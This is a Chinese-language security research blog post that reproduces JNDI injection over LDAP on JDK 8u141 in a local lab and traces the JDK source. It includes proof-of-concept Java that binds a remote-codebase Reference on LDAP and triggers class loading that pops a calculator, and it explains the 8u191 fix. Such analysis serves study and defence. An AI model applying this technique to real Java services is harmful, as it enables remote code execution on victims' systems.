参考博客：

[JNDI注入与动态类加载](https://halfblue.github.io/2021/11/18/JNDI%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/)

# 分析版本

jdk8u141

# 攻击实现

下载一个Apache Directory Studio，建一个JNDI服务器

![image-20240728163748182](https://s2.loli.net/2024/07/28/D2859mqtpcakUNY.png)

连接JNDI服务器

![image-20240728180529910](https://s2.loli.net/2024/07/28/QetwfJn5KjBPuRm.png)

认证填默认的

Bind password填secret

![image-20240728180400288](https://s2.loli.net/2024/07/28/mIOinDQJdE1TgBP.png)

连接之后

![image-20240728180613925](https://s2.loli.net/2024/07/28/NLOYQMdgFWSwR2x.png)

JNDILDAPServer.java

根据LDAP服务器信息，把引用绑到LDAP服务器上。

```java
public class JNDILDAPServer {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        Reference refObj = new Reference("Test", "Test", "http://localhost:4444/");
        initialContext.rebind("ldap://localhost:10389/cn=Test,dc=example,dc=com", refObj);
    }
}
```

![image-20240728181803643](https://s2.loli.net/2024/07/28/jzKlysUkuRQq6wn.png)

JNDILDAPClient.java

之后通过客户端lookup（注意把简易http服务器开起来）

```java
public class JNDILDAPClient {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://localhost:10389/cn=Test,dc=example,dc=com");
    }
}
```

![image-20240729162550331](https://s2.loli.net/2024/07/29/XqgGmwhKvADnWYy.png)

# 分析过程

之前在JNDI+RMI中也讲过了，`getURLOrDefaultInitCtx(name)`方法主要是根据我们写的name（`ldap://localhost:10389/cn=Test,dc=example,dc=com`），去判断jndi里面装了什么容器。这里我们就查到了`ldapURLContext`

```java
public Object lookup(String name) throws NamingException {
    return getURLOrDefaultInitCtx(name).lookup(name);
}
```

接下来直接跟到LdapCtx#c_lookup()，里面调用了decodeObject方法。传入var4参数，var4在下图中可以看到是在LDAP中查到的一些属性。

![image-20240729165337747](https://s2.loli.net/2024/07/29/vP8scLgHezykqMp.png)

跟进Obj#decodeObject()，我们知道JNDI里面可以装很多类型。下面if语句就是判断，拿到的是什么类型，选择相应的方法去decode。

**下面具体分析下这几个if**

```java
static Object decodeObject(Attributes var0) throws NamingException {
    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));

    try {
        Attribute var1;
        if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
            ClassLoader var3 = helper.getURLClassLoader(var2);
            return deserializeObject((byte[])((byte[])var1.get()), var3);
        } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
            return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
        } else {
            var1 = var0.get(JAVA_ATTRIBUTES[0]);
            return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
        }
    } catch (IOException var5) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var5);
        throw var4;
    }
}
```

![image-20240729170646012](https://s2.loli.net/2024/07/29/38shIZQdCrjYL6S.png)

1 `ClassLoader var3 = helper.getURLClassLoader(var2);` 调用到

```java
//com.sun.jndi.ldap.VersionHelper12
private static final String TRUST_URL_CODEBASE_PROPERTY = "com.sun.jndi.ldap.object.trustURLCodebase";
private static final String trustURLCodebase = (String)AccessController.doPrivileged(new PrivilegedAction<String>() {
    public String run() {
        return System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
    }
});

VersionHelper12() {
}
ClassLoader getURLClassLoader(String[] var1) throws MalformedURLException {
    ClassLoader var2 = this.getContextClassLoader();
    return (ClassLoader)(var1 != null && "true".equalsIgnoreCase(trustURLCodebase) ? URLClassLoader.newInstance(getUrlArray(var1), var2) : var2);
}
```

我jdk版本是8u141，可以看到这里也是做了trustURLCodebase的系统限制，不能远程加载类。

所以返回AppClassLoader。

 之后`return deserializeObject((byte[])((byte[])var1.get()), var3);`，第二个参数传入AppClassLoader

```java
private static Object deserializeObject(byte[] var0, ClassLoader var1) throws NamingException {
    try {
        ByteArrayInputStream var2 = new ByteArrayInputStream(var0);

        try {
            Object var20 = var1 == null ? new ObjectInputStream(var2) : new Obj.LoaderInputStream(var2, var1); 
            Throwable var21 = null;

            Object var5;
            try {
                var5 = ((ObjectInputStream)var20).readObject();//原生反序列化
            } catch (Throwable var16) {
//....
```

**原生反序列化也是可以利用的**

2 `decodeReference(var0, var2);` 

这里面调用到了1中的两个方法，也是有原生反序列化攻击点的。



decodeReference()，会把引用解出来。就是下面的var3（此时已经回到LdapCtx）

![image-20240729171231346](https://s2.loli.net/2024/07/29/Z6q9XUA3mfOWksz.png)

继续向下执行到`return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);`

注意这里又跳到DirectoryManager里面去了，和RMI一样攻击点是不在JNDI的文件中的。

后面和RMI的分析很像。

```java
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment, Attributes attrs)
    throws Exception {

        ObjectFactory factory;

        ObjectFactoryBuilder builder = getObjectFactoryBuilder();
        if (builder != null) {
            // builder must return non-null factory
            factory = builder.createObjectFactory(refInfo, environment);
            if (factory instanceof DirObjectFactory) {
                return ((DirObjectFactory)factory).getObjectInstance(
                    refInfo, name, nameCtx, environment, attrs);
            } else {
                return factory.getObjectInstance(refInfo, name, nameCtx,
                    environment);
            }
        }

        // use reference if possible
        Reference ref = null;
        if (refInfo instanceof Reference) {
            ref = (Reference) refInfo;
        } else if (refInfo instanceof Referenceable) {
            ref = ((Referenceable)(refInfo)).getReference();
        }

        Object answer;

        if (ref != null) {
            String f = ref.getFactoryClassName();
            if (f != null) {
                // if reference identifies a factory, use exclusively

                factory = getObjectFactoryFromReference(ref, f);                 //程序进入这个判断，运行到这儿
                if (factory instanceof DirObjectFactory) {
                    return ((DirObjectFactory)factory).getObjectInstance(
                        ref, name, nameCtx, environment, attrs);
                } else if (factory != null) {
                    return factory.getObjectInstance(ref, name, nameCtx,
                                                     environment);
                }
                // No factory found, so return original refInfo.
                // Will reach this point if factory class is not in
                // class path and reference does not contain a URL for it
                return refInfo;

            } else {
                // if reference has no factory, check for addresses
                // containing URLs
                // ignore name & attrs params; not used in URL factory

                answer = processURLAddrs(ref, name, nameCtx, environment);
                if (answer != null) {
                    return answer;
                }
            }
        }

        // try using any specified factories
        answer = createObjectFromFactories(refInfo, name, nameCtx,
                                           environment, attrs);
        return (answer != null) ? answer : refInfo;
}
```

接下来执行的` factory = getObjectFactoryFromReference(ref, f); `和之前RMI的流程是一样的。

**这里也使用到了VersionHelper12，但是其实在加载factory时，用的是com.sun.naming.internal.VersionHelper12，不是一个包下面的VersionHelper12，这个没有修复**

再回顾一下

首先调用AppClassLoader查找本地的类，查找不到。

再去codeBase路径下面查找，查找到类，进行初始化。

我弹计算器代码是写在静态代码块儿中的所以在初始化的时候就弹了计算器

![image-20240729172951886](https://s2.loli.net/2024/07/29/wQEqCXYH5FuZKGx.png)

写在构造函数中的会在下面实例化的时候弹计算器。

```java
return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
```

# LDAP的修复

在JDK8u191中进行了LDAP漏洞的修复

在动态加载factory时，用到的`com.sun.naming.internal.VersionHelper12`中也加入了一个信任codeBase判断。

```java
//VersionHelper12#loadClass()
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {
    if ("true".equalsIgnoreCase(trustURLCodebase)) {    //也加入了一个信任codeBase判断
        ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
                URLClassLoader.newInstance(getUrlArray(codebase), parent);

        return loadClass(className, cl);
    } else {
        return null;
    }
}
```